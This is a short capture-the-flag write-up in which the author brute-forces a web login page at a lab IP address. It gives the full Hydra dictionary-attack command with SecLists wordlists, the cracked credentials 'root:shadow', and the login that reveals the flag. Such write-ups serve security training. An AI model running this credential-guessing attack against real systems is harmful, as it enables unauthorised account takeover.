# Description
While analyzing the website, I found a **Sign In** button on the homepage. Clicking on it redirected me to a **login page** that required a username and password.

Since there were no apparent vulnerabilities like SQL injection, I decided to use **brute force** to try and find valid credentials.

## Tools Used
- **Hydra** – A popular tool for performing brute-force attacks.
- **SecLists** – A collection of common username and password wordlists.

## Exploitation Process

1. **Installing Hydra:**
   ```bash
   sudo apt install hydra
   ```

2. **Downloading SecLists:**
   ```bash
   git clone https://github.com/danielmiessler/SecLists.git
   ```

3. **Running Hydra:**
   I used Hydra to perform a dictionary attack with a shortlist of common usernames and passwords.
   
   ```bash
   hydra -L SecLists/Usernames/top-usernames-shortlist.txt \
         -P SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt \
         -F 10.11.100.236 http-get-form \
         "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
   ```

4. **Result:**
   After running the attack, I successfully obtained valid credentials:
   ```
   [80][http-get-form] host: 10.11.100.236   login: root   password: shadow
   ```

5. **Logging In:**
   I used `root:shadow` to log into the website, and it successfully authenticated me.

6. **Flag:**
   After logging in, the website displayed the **flag**.

